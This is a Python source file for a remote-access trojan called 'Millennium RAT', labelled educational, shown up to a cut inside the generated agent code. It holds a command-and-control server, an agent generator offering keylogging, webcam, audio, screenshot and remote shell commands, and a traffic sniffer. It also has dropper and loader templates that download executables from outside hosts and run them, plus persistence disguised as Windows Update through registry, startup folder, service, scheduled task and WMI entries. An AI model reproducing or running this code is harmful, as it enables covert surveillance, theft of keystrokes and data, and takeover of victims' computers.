#!/usr/bin/env python3
"""
Millennium RAT Toolkit - Professional Edition
Advanced Remote Access Tool with comprehensive capabilities
Educational cybersecurity framework for red/blue team training
"""

import os
import sys
import json
import time
import socket
import hashlib
import base64
import platform
import subprocess
import threading
import struct
import zlib
import sqlite3
import tempfile
import shutil
import psutil
import requests
import zipfile
import winreg
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Optional
import urllib.request
import urllib.parse
import ssl
import re
from cryptography.fernet import Fernet
import mss
import cv2
import numpy as np
import pyaudio
import wave
import keyring
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib

class AdvancedNetworkSniffer:
    """Advanced HTTP/HTTPS traffic sniffing for educational purposes"""

    def __init__(self):
        self.captured_data = []
        self.is_running = False
        self.target_domains = []

    def start_http_sniffing(self, interface="all", port_filter=None):
        """Start HTTP traffic sniffing with comprehensive analysis"""
        print("[SNIFFER] Starting comprehensive HTTP traffic analysis...")

        self.is_running = True

        # Multiple sniffing methods for educational demonstration
        threading.Thread(target=self._packet_capture_method, daemon=True).start()
        threading.Thread(target=self._proxy_intercept_method, daemon=True).start()
        threading.Thread(target=self._dns_query_monitor, daemon=True).start()
        threading.Thread(target=self._ssl_certificate_monitor, daemon=True).start()

    def _packet_capture_method(self):
        """Raw packet capture and analysis"""
        try:
            import scapy.all as scapy
            from scapy.layers import http

            def process_packet(packet):
                if packet.haslayer(http.HTTPRequest):
                    http_layer = packet[http.HTTPRequest]

                    captured_data = {
                        "timestamp": datetime.now().isoformat(),
                        "method": "packet_capture",
                        "src_ip": packet[scapy.IP].src,
                        "dst_ip": packet[scapy.IP].dst,
                        "url": http_layer.Host.decode() + http_layer.Path.decode(),
                        "method_type": http_layer.Method.decode(),
                        "user_agent": http_layer.User_Agent.decode() if http_layer.User_Agent else "",
                        "headers": self._extract_headers(packet),
                        "payload_size": len(packet)
                    }

                    self.captured_data.append(captured_data)
                    print(f"[SNIFFER] Captured HTTP: {captured_data['url']}")

                if packet.haslayer(http.HTTPResponse):
                    response_data = {
                        "timestamp": datetime.now().isoformat(),
                        "method": "response_capture",
                        "status_code": packet[http.HTTPResponse].Status_Code.decode(),
                        "content_length": packet[http.HTTPResponse].Content_Length.decode() if packet[http.HTTPResponse].Content_Length else "0",
                        "content_type": packet[http.HTTPResponse].Content_Type.decode() if packet[http.HTTPResponse].Content_Type else "",
                        "server": packet[http.HTTPResponse].Server.decode() if packet[http.HTTPResponse].Server else ""
                    }

                    self.captured_data.append(response_data)

            scapy.sniff(filter="tcp port 80", prn=process_packet, stop_filter=lambda x: not self.is_running)

        except ImportError:
            print("[SNIFFER] Scapy not available, using alternative method")
            self._alternative_capture_method()
        except Exception as e:
            print(f"[SNIFFER] Packet capture error: {e}")

    def _proxy_intercept_method(self):
        """HTTP proxy interception for HTTPS traffic analysis"""
        try:
            from http.server import HTTPServer, BaseHTTPRequestHandler
            import ssl

            class InterceptHandler(BaseHTTPRequestHandler):
                def do_GET(self):
                    self._log_request()
                    self.send_response(200)
                    self.end_headers()

                def do_POST(self):
                    content_length = int(self.headers.get('Content-Length', 0))
                    post_data = self.rfile.read(content_length)
                    self._log_request(post_data)
                    self.send_response(200)
                    self.end_headers()

                def _log_request(self, post_data=None):
                    captured = {
                        "timestamp": datetime.now().isoformat(),
                        "method": "proxy_intercept",
                        "path": self.path,
                        "headers": dict(self.headers),
                        "client_address": self.client_address[0],
                        "post_data": post_data.decode('utf-8', errors='ignore') if post_data else None
                    }
                    self.server.sniffer.captured_data.append(captured)
                    print(f"[SNIFFER] Intercepted: {self.path}")

            server = HTTPServer(('127.0.0.1', 8080), InterceptHandler)
            server.sniffer = self
            server.serve_forever()

        except Exception as e:
            print(f"[SNIFFER] Proxy intercept error: {e}")

    def _dns_query_monitor(self):
        """Monitor DNS queries for traffic analysis"""
        try:
            import socket
            import struct

            # Create raw socket for DNS monitoring
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)

            while self.is_running:
                try:
                    packet, addr = sock.recvfrom(1024)

                    # Basic DNS packet parsing
                    if len(packet) > 12:
                        dns_header = struct.unpack('!HHHHHH', packet[:12])
                        if dns_header[2] & 0x8000 == 0:  # Query
                            domain = self._parse_dns_query(packet[12:])
                            if domain:
                                captured = {
                                    "timestamp": datetime.now().isoformat(),
                                    "method": "dns_monitor",
                                    "domain": domain,
                                    "source_ip": addr[0]
                                }
                                self.captured_data.append(captured)
                                print(f"[SNIFFER] DNS Query: {domain}")

                except Exception as e:
                    continue

        except PermissionError:
            print("[SNIFFER] DNS monitoring requires elevated privileges")
        except Exception as e:
            print(f"[SNIFFER] DNS monitor error: {e}")

    def _ssl_certificate_monitor(self):
        """Monitor SSL certificate information"""
        try:
            import ssl
            import socket

            def check_ssl_cert(hostname, port=443):
                try:
                    context = ssl.create_default_context()
                    with socket.create_connection((hostname, port), timeout=5) as sock:
                        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                            cert = ssock.getpeercert()

                            captured = {
                                "timestamp": datetime.now().isoformat(),
                                "method": "ssl_monitor",
                                "hostname": hostname,
                                "issuer": dict(x[0] for x in cert['issuer']),
                                "subject": dict(x[0] for x in cert['subject']),
                                "version": cert['version'],
                                "serial_number": cert['serialNumber'],
                                "not_before": cert['notBefore'],
                                "not_after": cert['notAfter']
                            }

                            self.captured_data.append(captured)
                            print(f"[SNIFFER] SSL Cert: {hostname}")

                except Exception:
                    pass

            # Monitor common domains
            common_domains = ['google.com', 'facebook.com', 'amazon.com', 'microsoft.com']

            while self.is_running:
                for domain in common_domains:
                    if not self.is_running:
                        break
                    check_ssl_cert(domain)
                    time.sleep(30)

        except Exception as e:
            print(f"[SNIFFER] SSL monitor error: {e}")

    def _extract_headers(self, packet):
        """Extract HTTP headers from packet"""
        headers = {}
        try:
            # Basic header extraction
            raw_headers = str(packet).split('\\r\\n')
            for header in raw_headers:
                if ':' in header:
                    key, value = header.split(':', 1)
                    headers[key.strip()] = value.strip()
        except:
            pass
        return headers

    def _parse_dns_query(self, data):
        """Parse DNS query from packet data"""
        try:
            domain_parts = []
            i = 0
            while i < len(data) and data[i] != 0:
                length = data[i]
                if length == 0:
                    break
                domain_parts.append(data[i+1:i+1+length].decode('utf-8', errors='ignore'))
                i += length + 1
            return '.'.join(domain_parts)
        except:
            return None

    def get_captured_data(self):
        """Return all captured traffic data"""
        return self.captured_data.copy()

    def stop_sniffing(self):
        """Stop all sniffing operations"""
        self.is_running = False
        print("[SNIFFER] Stopping traffic analysis...")

class AdvancedPayloadDeployer:
    """Advanced payload deployment and management system"""

    def __init__(self):
        self.payloads = {}
        self.deployment_methods = []

    def create_dropper_payload(self, target_executable, deploy_method="http_download"):
        """Create advanced dropper payload"""
        print(f"[DEPLOYER] Creating dropper for: {target_executable}")

        dropper_template = f'''
import requests
import os
import subprocess
import tempfile
import base64
import zipfile
import threading
import time
from pathlib import Path

class AdvancedDropper:
    def __init__(self):
        self.target_url = "{target_executable}"
        self.backup_urls = [
            "http://backup1.example.com/payload.exe",
            "http://backup2.example.com/payload.exe"
        ]

    def deploy_payload(self):
        """Deploy payload with multiple fallback methods"""
        methods = [
            self._http_download,
            self._base64_embedded,
            self._github_download,
            self._pastebin_download,
            self._dns_exfiltration
        ]

        for method in methods:
            try:
                if method():
                    return True
            except Exception as e:
                continue
        return False

    def _http_download(self):
        """Download via HTTP with obfuscation"""
        try:
            headers = {{
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }}

            response = requests.get(self.target_url, headers=headers, timeout=30)
            if response.status_code == 200:
                return self._execute_payload(response.content)
        except:
            pass
        return False

    def _base64_embedded(self):
        """Use embedded base64 payload"""
        embedded_payload = "TVqQAAMAAAAEAAAA..."  # Truncated for safety
        try:
            payload_data = base64.b64decode(embedded_payload)
            return self._execute_payload(payload_data)
        except:
            pass
        return False

    def _github_download(self):
        """Download from GitHub raw content"""
        try:
            github_urls = [
                "https://raw.githubusercontent.com/user/repo/main/payload.exe",
                "https://github.com/user/repo/releases/download/v1.0/payload.exe"
            ]

            for url in github_urls:
                try:
                    response = requests.get(url, timeout=20)
                    if response.status_code == 200:
                        return self._execute_payload(response.content)
                except:
                    continue
        except:
            pass
        return False

    def _pastebin_download(self):
        """Download from pastebin-like services"""
        try:
            pastebin_urls = [
                "https://pastebin.com/raw/12345678",
                "https://paste.ubuntu.com/p/12345678/",
                "https://hastebin.com/raw/12345678"
            ]

            for url in pastebin_urls:
                try:
                    response = requests.get(url, timeout=15)
                    if response.status_code == 200:
                        # Assume base64 encoded payload
                        payload_data = base64.b64decode(response.text)
                        return self._execute_payload(payload_data)
                except:
                    continue
        except:
            pass
        return False

    def _dns_exfiltration(self):
        """Use DNS TXT records for payload delivery"""
        try:
            import dns.resolver

            # Query DNS TXT record containing base64 payload
            answers = dns.resolver.resolve('payload.example.com', 'TXT')
            for rdata in answers:
                txt_data = str(rdata).strip('"')
                if txt_data.startswith('payload:'):
                    payload_b64 = txt_data[8:]
                    payload_data = base64.b64decode(payload_b64)
                    return self._execute_payload(payload_data)
        except:
            pass
        return False

    def _execute_payload(self, payload_data):
        """Execute downloaded payload safely"""
        try:
            temp_dir = tempfile.mkdtemp()
            payload_path = os.path.join(temp_dir, "payload.exe")

            with open(payload_path, 'wb') as f:
                f.write(payload_data)

            os.chmod(payload_path, 0o755)

            # Execute with various methods
            execution_methods = [
                lambda: subprocess.Popen([payload_path], shell=False),
                lambda: os.system(f'"{payload_path}"'),
                lambda: subprocess.run([payload_path], shell=False)
            ]

            for method in execution_methods:
                try:
                    method()
                    return True
                except:
                    continue

        except Exception as e:
            pass
        return False

    def install_persistence(self):
        """Install various persistence mechanisms"""
        persistence_methods = [
            self._registry_persistence,
            self._startup_folder_persistence,
            self._service_persistence,
            self._scheduled_task_persistence,
            self._wmi_persistence
        ]

        for method in persistence_methods:
            try:
                method()
            except:
                continue

    def _registry_persistence(self):
        """Registry-based persistence"""
        try:
            import winreg
            key_path = r"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
            winreg.CloseKey(key)
        except:
            pass

    def _startup_folder_persistence(self):
        """Startup folder persistence"""
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup')
            script_copy = os.path.join(startup_folder, 'WindowsUpdate.py')
            shutil.copy2(__file__, script_copy)
        except:
            pass

    def _service_persistence(self):
        """Windows service persistence"""
        try:
            service_template = f'''
import win32serviceutil
import win32service
import win32event
import servicemanager

class WindowsUpdateService(win32serviceutil.ServiceFramework):
    _svc_name_ = "WindowsUpdateService"
    _svc_display_name_ = "Windows Update Service"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        # Service main logic here
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                            servicemanager.PYS_SERVICE_STARTED,
                            (self._svc_name_, ''))

        # Execute main payload
        exec(open(r"{__file__}").read())

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(WindowsUpdateService)
'''

            service_path = os.path.join(tempfile.gettempdir(), 'windows_update_service.py')
            with open(service_path, 'w') as f:
                f.write(service_template)

            # Install service
            subprocess.run([sys.executable, service_path, 'install'], shell=True)
            subprocess.run([sys.executable, service_path, 'start'], shell=True)

        except:
            pass

    def _scheduled_task_persistence(self):
        """Scheduled task persistence"""
        try:
            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>python</Command>
      <Arguments>"{__file__}"</Arguments>
    </Exec>
  </Actions>
</Task>'''

            task_file = os.path.join(tempfile.gettempdir(), 'WindowsUpdate.xml')
            with open(task_file, 'w') as f:
                f.write(task_xml)

            subprocess.run([
                'schtasks', '/create', '/tn', 'WindowsUpdate', 
                '/xml', task_file, '/f'
            ], shell=True)

        except:
            pass

    def _wmi_persistence(self):
        """WMI event subscription persistence"""
        try:
            import wmi

            c = wmi.WMI()

            # Create WMI event filter
            filter_name = "WindowsUpdateFilter"
            filter_query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"

            # Create WMI event consumer
            consumer_name = "WindowsUpdateConsumer"
            consumer_command = f'python "{__file__}"'

            # Register WMI event subscription
            c.Win32_Process.Create(CommandLine=f'wmic /NAMESPACE:\\\\\\\\.\\\\\\\\root\\\\subscription PATH __EventFilter CREATE Name="{filter_name}", EventNameSpace="root\\\\cimv2", QueryLanguage="WQL", Query="{filter_query}"')
            c.Win32_Process.Create(CommandLine=f'wmic /NAMESPACE:\\\\\\\\.\\\\\\\\root\\\\subscription PATH CommandLineEventConsumer CREATE Name="{consumer_name}", CommandLineTemplate="{consumer_command}"')

        except:
            pass

if __name__ == "__main__":
    dropper = AdvancedDropper()
    if dropper.deploy_payload():
        dropper.install_persistence()
'''

        return dropper_template

    def create_loader_payload(self, payloads_list):
        """Create multi-stage loader"""
        print(f"[DEPLOYER] Creating loader for {len(payloads_list)} payloads")

        loader_template = f'''
import threading
import time
import subprocess
import requests
import base64
import os

class AdvancedLoader:
    def __init__(self):
        self.payloads = {payloads_list}
        self.loaded_count = 0

    def load_all_payloads(self):
        """Load all payloads with threading"""
        threads = []

        for payload in self.payloads:
            thread = threading.Thread(target=self._load_single_payload, args=(payload,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(2)  # Stagger loading

        # Wait for all threads
        for thread in threads:
            thread.join(timeout=30)

        print(f"[LOADER] Successfully loaded {{self.loaded_count}}/{{len(self.payloads)}} payloads")

    def _load_single_payload(self, payload_info):
        """Load individual payload"""
        try:
            url = payload_info['url']
            method = payload_info.get('method', 'direct')

            if method == 'direct':
                response = requests.get(url, timeout=30)
                if response.status_code == 200:
                    self._execute_payload(response.content, payload_info.get('type', 'exe'))

            elif method == 'base64':
                response = requests.get(url, timeout=30)
                if response.status_code == 200:
                    decoded_payload = base64.b64decode(response.text)
                    self._execute_payload(decoded_payload, payload_info.get('type', 'exe'))

            self.loaded_count += 1

        except Exception as e:
            print(f"[LOADER] Failed to load payload: {{e}}")

    def _execute_payload(self, payload_data, payload_type):
        """Execute payload based on type"""
        if payload_type == 'exe':
            self._execute_executable(payload_data)
        elif payload_type == 'script':
            self._execute_script(payload_data)
        elif payload_type == 'dll':
            self._load_dll(payload_data)

    def _execute_executable(self, exe_data):
        """Execute executable payload"""
        temp_path = os.path.join(os.getenv('TEMP'), f'payload_{{int(time.time())}}.exe')
        with open(temp_path, 'wb') as f:
            f.write(exe_data)
        os.chmod(temp_path, 0o755)
        subprocess.Popen([temp_path], shell=False)

    def _execute_script(self, script_data):
        """Execute script payload"""
        exec(script_data.decode('utf-8'))

    def _load_dll(self, dll_data):
        """Load DLL payload"""
        try:
            import ctypes
            temp_path = os.path.join(os.getenv('TEMP'), f'payload_{{int(time.time())}}.dll')
            with open(temp_path, 'wb') as f:
                f.write(dll_data)
            ctypes.windll.LoadLibrary(temp_path)
        except:
            pass

if __name__ == "__main__":
    loader = AdvancedLoader()
    loader.load_all_payloads()
'''

        return loader_template

class MillenniumRATCore:
    """Core Millennium RAT functionality with advanced features"""

    def __init__(self):
        self.version = "4.0"
        self.server_ip = "0.0.0.0"
        self.server_port = 8888
        self.clients = {}
        self.is_running = False
        self.sniffer = AdvancedNetworkSniffer()
        self.deployer = AdvancedPayloadDeployer()

    def start_millennium_server(self, port=8888):
        """Start Millennium RAT server with full capabilities"""
        self.server_port = port
        self.is_running = True

        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    MILLENNIUM RAT v{self.version}                     ║
║              Professional Remote Access Tool                 ║
║                Educational Cybersecurity Framework           ║
╚══════════════════════════════════════════════════════════════╝

[MILLENNIUM] Starting C&C server on port {port}...
[MILLENNIUM] HTTP sniffer integration enabled
[MILLENNIUM] Payload deployment system ready
[MILLENNIUM] Advanced persistence mechanisms loaded
""")

        # Start network sniffer
        self.sniffer.start_http_sniffing()

        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((self.server_ip, self.server_port))
            server_socket.listen(50)  # Support more connections

            print(f"[MILLENNIUM] Server listening on {self.server_ip}:{self.server_port}")
            print("[MILLENNIUM] Waiting for agent connections...")

            while self.is_running:
                try:
                    client_socket, address = server_socket.accept()
                    client_id = f"millennium_{address[0]}_{int(time.time())}"

                    print(f"[MILLENNIUM] New agent connected: {address} (ID: {client_id})")

                    # Enhanced client handler
                    client_thread = threading.Thread(
                        target=self._handle_millennium_client,
                        args=(client_socket, address, client_id)
                    )
                    client_thread.daemon = True
                    client_thread.start()

                    self.clients[client_id] = {
                        'socket': client_socket,
                        'address': address,
                        'thread': client_thread,
                        'connected_at': datetime.now(),
                        'last_seen': datetime.now(),
                        'capabilities': [],
                        'system_info': {},
                        'active_modules': []
                    }

                except Exception as e:
                    if self.is_running:
                        print(f"[MILLENNIUM] Connection error: {e}")

        except Exception as e:
            print(f"[MILLENNIUM] Server error: {e}")
        finally:
            server_socket.close()
            self.sniffer.stop_sniffing()

    def _handle_millennium_client(self, client_socket, address, client_id):
        """Enhanced client handler with advanced features"""
        try:
            # Initial handshake and capability discovery
            self._send_command(client_socket, {
                'type': 'millennium_handshake',
                'version': self.version,
                'capabilities_request': True
            })

            while self.is_running:
                try:
                    data = self._receive_data(client_socket)
                    if not data:
                        break

                    message = json.loads(data.decode())
                    self._process_millennium_message(client_socket, client_id, message)

                    if client_id in self.clients:
                        self.clients[client_id]['last_seen'] = datetime.now()

                except Exception as e:
                    print(f"[MILLENNIUM] Client {client_id} error: {e}")
                    break

        except Exception as e:
            print(f"[MILLENNIUM] Handler error for {client_id}: {e}")
        finally:
            client_socket.close()
            if client_id in self.clients:
                del self.clients[client_id]
            print(f"[MILLENNIUM] Agent {client_id} disconnected")

    def _process_millennium_message(self, sock, client_id, message):
        """Process messages from Millennium agents"""
        msg_type = message.get('type')

        if msg_type == 'millennium_handshake_response':
            capabilities = message.get('capabilities', [])
            system_info = message.get('system_info', {})

            if client_id in self.clients:
                self.clients[client_id]['capabilities'] = capabilities
                self.clients[client_id]['system_info'] = system_info

            print(f"[MILLENNIUM] Agent {client_id} capabilities: {', '.join(capabilities)}")

        elif msg_type == 'sniffer_data':
            # Handle sniffed traffic data from agent
            traffic_data = message.get('data', [])
            print(f"[MILLENNIUM] Received {len(traffic_data)} traffic samples from {client_id}")

        elif msg_type == 'payload_deployment_result':
            result = message.get('result', 'unknown')
            payload_id = message.get('payload_id', 'unknown')
            print(f"[MILLENNIUM] Payload {payload_id} deployment: {result}")

        elif msg_type == 'keylog_data':
            keystrokes = message.get('keystrokes', '')
            window_title = message.get('window_title', '')
            print(f"[MILLENNIUM] Keylog from {client_id} [{window_title}]: {keystrokes}")

        elif msg_type == 'screen_capture':
            self._handle_screen_capture(client_id, message)

        elif msg_type == 'audio_capture':
            self._handle_audio_capture(client_id, message)

        elif msg_type == 'webcam_capture':
            self._handle_webcam_capture(client_id, message)

        elif msg_type == 'file_manager_response':
            self._handle_file_manager_response(client_id, message)

        elif msg_type == 'registry_data':
            self._handle_registry_data(client_id, message)

        elif msg_type == 'process_list':
            processes = message.get('processes', [])
            print(f"[MILLENNIUM] {client_id} running {len(processes)} processes")

        elif msg_type == 'network_scan_results':
            scan_results = message.get('results', [])
            print(f"[MILLENNIUM] Network scan from {client_id}: {len(scan_results)} hosts found")

    def _send_command(self, sock, command):
        """Send command to Millennium agent"""
        try:
            message = json.dumps(command).encode()
            length = struct.pack('!I', len(message))
            sock.sendall(length + message)
            return True
        except Exception:
            return False

    def _receive_data(self, sock):
        """Receive data from Millennium agent"""
        try:
            length_data = sock.recv(4)
            if len(length_data) < 4:
                return None

            message_length = struct.unpack('!I', length_data)[0]
            message = b''
            while len(message) < message_length:
                chunk = sock.recv(message_length - len(message))
                if not chunk:
                    return None
                message += chunk

            return message
        except Exception:
            return None

    def deploy_payload_to_client(self, client_id, payload_config):
        """Deploy payload to specific Millennium agent"""
        if client_id not in self.clients:
            print(f"[MILLENNIUM] Client {client_id} not found")
            return False

        deployment_command = {
            'type': 'deploy_payload',
            'payload_id': payload_config.get('id', f'payload_{int(time.time())}'),
            'payload_url': payload_config.get('url'),
            'payload_type': payload_config.get('type', 'exe'),
            'execution_method': payload_config.get('execution_method', 'direct'),
            'persistence': payload_config.get('persistence', False),
            'stealth_mode': payload_config.get('stealth_mode', True)
        }

        client_socket = self.clients[client_id]['socket']
        success = self._send_command(client_socket, deployment_command)

        if success:
            print(f"[MILLENNIUM] Payload deployment initiated for {client_id}")
        else:
            print(f"[MILLENNIUM] Failed to send payload to {client_id}")

        return success

    def start_traffic_sniffing(self, client_id, target_interfaces=None):
        """Start HTTP traffic sniffing on target client"""
        if client_id not in self.clients:
            return False

        sniff_command = {
            'type': 'start_http_sniffer',
            'interfaces': target_interfaces or ['all'],
            'protocols': ['HTTP', 'HTTPS', 'DNS'],
            'capture_payloads': True,
            'real_time_stream': True
        }

        client_socket = self.clients[client_id]['socket']
        return self._send_command(client_socket, sniff_command)

    def interactive_millennium_shell(self):
        """Enhanced interactive shell for Millennium RAT"""
        print("""
[MILLENNIUM] Interactive Command Shell
Available commands:
  agents                    - List all connected agents
  select <agent_id>         - Select agent for interaction
  deploy <payload_config>     <payload_config>   - Deploy payload to all agents
  sniff <agent_id>          - Start traffic sniffing
  broadcast <command>       - Send command to all agents
  stats                     - Show server statistics
  exit                      - Shutdown server
        """)

        while self.is_running:
            try:
                command = input("Millennium> ").strip()

                if command == 'exit':
                    self.is_running = False
                    break
                elif command == 'agents':
                    self._list_millennium_agents()
                elif command.startswith('select '):
                    agent_id = command.split(' ', 1)[1]
                    self._agent_interaction_shell(agent_id)
                elif command.startswith('deploy '):
                    payload_config = command.split(' ', 1)[1]
                    self._deploy_to_all_agents(payload_config)
                elif command.startswith('sniff '):
                    agent_id = command.split(' ', 1)[1]
                    self.start_traffic_sniffing(agent_id)
                elif command.startswith('broadcast '):
                    cmd = command.split(' ', 1)[1]
                    self._broadcast_command(cmd)
                elif command == 'stats':
                    self._show_server_stats()
                else:
                    print("[MILLENNIUM] Unknown command. Type commands for help.")

            except KeyboardInterrupt:
                print("\n[MILLENNIUM] Shutting down...")
                self.is_running = False
                break
            except Exception as e:
                print(f"[MILLENNIUM] Shell error: {e}")

    def _list_millennium_agents(self):
        """List all connected Millennium agents"""
        print(f"\n[MILLENNIUM] Connected Agents ({len(self.clients)}):")
        print("-" * 80)

        for client_id, client_info in self.clients.items():
            address = client_info['address']
            connected_at = client_info['connected_at']
            capabilities = client_info.get('capabilities', [])
            system_info = client_info.get('system_info', {})

            print(f"Agent ID: {client_id}")
            print(f"  Address: {address[0]}:{address[1]}")
            print(f"  Connected: {connected_at}")
            print(f"  System: {system_info.get('platform', 'Unknown')} {system_info.get('version', '')}")
            print(f"  Capabilities: {', '.join(capabilities)}")
            print("-" * 40)

    def _agent_interaction_shell(self, agent_id):
        """Interactive shell for specific agent"""
        if agent_id not in self.clients:
            print(f"[MILLENNIUM] Agent {agent_id} not found")
            return

        print(f"\n[MILLENNIUM] Connected to agent {agent_id}")
        print("Agent commands: screenshot, keylog, webcam, audio, files, registry, processes, network, shell, back")

        while True:
            try:
                command = input(f"Millennium({agent_id})> ").strip()

                if command == 'back':
                    break
                elif command == 'screenshot':
                    self._send_command(self.clients[agent_id]['socket'], {'type': 'take_screenshot'})
                elif command == 'keylog':
                    self._send_command(self.clients[agent_id]['socket'], {'type': 'start_keylogger'})
                elif command == 'webcam':
                    self._send_command(self.clients[agent_id]['socket'], {'type': 'capture_webcam'})
                elif command == 'audio':
                    self._send_command(self.clients[agent_id]['socket'], {'type': 'record_audio'})
                elif command == 'files':
                    path = input("Directory path [C:\\\\]: ").strip() or "C:\\\\"
                    self._send_command(self.clients[agent_id]['socket'], {
                        'type': 'file_manager',
                        'action': 'list',
                        'path': path
                    })
                elif command == 'registry':
                    key = input("Registry key: ").strip()
                    if key:
                        self._send_command(self.clients[agent_id]['socket'], {
                            'type': 'registry_read',
                            'key': key
                        })
                elif command == 'processes':
                    self._send_command(self.clients[agent_id]['socket'], {'type': 'list_processes'})
                elif command == 'network':
                    self._send_command(self.clients[agent_id]['socket'], {'type': 'network_scan'})
                elif command.startswith('shell '):
                    cmd = command[6:]
                    self._send_command(self.clients[agent_id]['socket'], {
                        'type': 'execute_shell',
                        'command': cmd
                    })
                else:
                    print("Unknown command")

            except KeyboardInterrupt:
                print("\n[MILLENNIUM] Returning to main shell...")
                break

    def create_millennium_agent(self, server_ip="127.0.0.1", server_port=8888):
        """Generate comprehensive Millennium RAT agent"""

        agent_code = f'''#!/usr/bin/env python3
"""
Millennium RAT Agent v{self.version}
Advanced Remote Access Agent with comprehensive capabilities
Educational cybersecurity framework component
"""

import socket
import json
import base64
import struct
import threading
import time
import os
import sys
import subprocess
import platform
import psutil
import mss
import cv2
import numpy as np
import pyaudio
import wave
import winreg
import requests
import tempfile
from datetime import datetime
from pathlib import Path

class MillenniumAgent:
    def __init__(self, server_ip="{server_ip}", server_port={server_port}):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        self.is_connected = False
        self.modules = {{
            'keylogger': False,
            'sniffer': False,
            'audio_recorder': False,
            'screen_monitor': False,
            'file_manager': False,
            'registry_manager': False,
            'process_manager': False,
            'network_scanner': False
        }}

    def connect_to_millennium_server(self):
        """Connect to Millennium C&C server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            self.is_connected = True

            print(f"[AGENT] Connected to Millennium server {{self.server_ip}}:{{self.server_port}}")

            # Listen for commands
            self.listen_for_millennium_commands()

        except Exception as e:
            print(f"[AGENT] Connection failed: {{e}}")
            time.sleep(10)
            self.connect_to_millennium_server()  # Retry

    def send_message(self, message):
        """Send message to Millennium server"""
        try:
            data = json.dumps(message).encode()
            length = struct.pack('!I', len(data))
            self.socket.sendall(length + data)
        except Exception as e:
            print(f"[AGENT] Send error: {{e}}")
            self.is_connected = False

    def receive_message(self):
        """Receive message from Millennium server"""
        try:
            length_data = self.socket.recv(4)
            if len(length_data) < 4:
                return None

            message_length = struct.unpack('!I', length_data)[0]
            message = b''
            while len(message) < message_length:
                chunk = self.socket.recv(message_length - len(message))
                if not chunk:
                    return None
                message += chunk

            return json.loads(message.decode())
        except Exception as e:
            print(f"[AGENT] Receive error: {{e}}")
            self.is_connected = False
            return None

    def listen_for_millennium_commands(self):
        """Listen for commands from Millennium server"""
        while self.is_connected:
            try:
                command = self.receive_message()
                if not command:
                    break

                self.execute_millennium_command(command)

            except Exception as e:
                print(f"[AGENT] Listen error: {{e}}")
                break

        self.socket.close()
        time.sleep(5)
        self.connect_to_millennium_server()

    def execute_millennium_command(self, command):
        """Execute command from Millennium server"""
        cmd_type = command.get('type')

        try:
            if cmd_type == 'millennium_handshake':
                self.send_handshake_response()
            elif cmd_type == 'take_screenshot':
                self.capture_screenshot()
            elif cmd_type == 'start_keylogger':
                self.start_keylogger()
            elif cmd_type == 'capture_webcam':
                self.capture_webcam()
            elif cmd_type == 'record_audio':
                self.record_audio()
            elif cmd_type == 'file_manager':
                self.handle_file_manager(command)
            elif cmd_type == 'registry_read':
                self.read_registry(command.get('key'))
            elif cmd_type == 'list_processes':
                self.list_processes()
            elif cmd_type == 'network_scan':
                self.network_scan()
            elif cmd_type == 'execute_shell':
                self.execute_shell_command(command.get('command'))
            elif cmd_type == 'deploy_payload':
                self.deploy_payload(command)
            elif cmd_type == 'start_http_sniffer':
                self.start_http_sniffer(command)

        except Exception as e:
            self.send_message({{
                'type': 'error',
                'error': str(e),
                'command': cmd_type
            }})

    def send_handshake_response(self):
        """Send handshake response with capabilities"""
        capabilities = [
            'screenshot', 'keylogger', 'webcam', 'audio',
            'file_manager', 'registry', 'processes', 'network_scan',
            'shell_execution', 'payload_deployment', 'http_sniffer'
        ]

        system_info = {{
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'version': platform.version(),
            'architecture': platform.architecture()[0],
            'processor': platform.processor(),
            'username': os.getenv('USERNAME') or os.getenv('USER'),
            'ip_address': socket.gethostbyname(socket.gethostname()),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
            'disk_usage': psutil.disk_usage('/').total if platform.system() != 'Windows' else psutil.disk_usage('C:').total
        }}

        self.send_message({{
            'type': 'millennium_handshake_response',
            'capabilities': capabilities,
            'system_info': system_info,
            'agent_version': '{self.version}'
        }})

    def capture_screenshot(self):
        """Capture screenshot"""
        try:
            with mss.mss() as sct:
                screenshot = sct.grab(sct.monitors[1])
                img = np.array(screenshot)

                # Convert to bytes
                _, buffer = cv2.imencode('.png', img)
